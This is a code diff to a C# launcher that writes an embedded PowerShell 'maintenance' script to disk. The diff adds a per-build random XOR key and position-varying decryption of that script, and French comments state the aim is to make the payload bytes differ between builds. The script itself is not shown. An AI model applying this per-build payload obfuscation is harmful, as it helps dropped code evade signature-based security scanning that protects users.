@@ -29,6 +29,8 @@ namespace _OlivM
         [DllImport("user32.dll", CharSet = CharSet.Unicode)]
         static extern int MessageBoxW(IntPtr hWnd, string text, string caption, uint type);
 
+        // clé de déchiffrement de la charge utile, tirée au hasard à chaque build (build.ps1 remplace __XORKEY__)
+        static readonly byte[] Key = new byte[] { __XORKEY__ };
         static readonly SecurityIdentifier Admins = new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null);
         static readonly SecurityIdentifier SystemSid = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
         static readonly SecurityIdentifier Users = new SecurityIdentifier(WellKnownSidType.BuiltinUsersSid, null);
@@ -50,11 +52,20 @@ namespace _OlivM
                 foreach (string f in Directory.GetFiles(app)) File.Delete(f);
                 foreach (string d in Directory.GetDirectories(app)) Directory.Delete(d, true);
                 string ps1 = Path.Combine(app, "Oliv_Maintenance.ps1");
+                // charge utile chiffrée (XOR avec la clé propre à cette compilation, générée au hasard à chaque build) puis
+                // compressée : les octets de la ressource diffèrent d'une compilation à l'autre et de l'édition professionnelle
                 using (Stream res = Assembly.GetExecutingAssembly().GetManifestResourceStream("app.ps1.gz"))
-                using (GZipStream gz = new GZipStream(res, CompressionMode.Decompress))
-                using (FileStream fs = new FileStream(ps1, FileMode.CreateNew, FileAccess.Write, FileShare.Read))
+                using (MemoryStream enc = new MemoryStream())
                 {
-                    gz.CopyTo(fs);
+                    res.CopyTo(enc);
+                    byte[] blob = enc.ToArray(); byte[] key = Key;
+                    for (int i = 0; i < blob.Length; i++) blob[i] ^= (byte)(key[i % key.Length] ^ (i * 31 + 17));
+                    using (MemoryStream plain = new MemoryStream(blob))
+                    using (GZipStream gz = new GZipStream(plain, CompressionMode.Decompress))
+                    using (FileStream fs = new FileStream(ps1, FileMode.CreateNew, FileAccess.Write, FileShare.Read))
+                    {
+                        gz.CopyTo(fs);
+                    }
                 }
 
                 string sys32 = Environment.GetFolderPath(Environment.SpecialFolder.System);
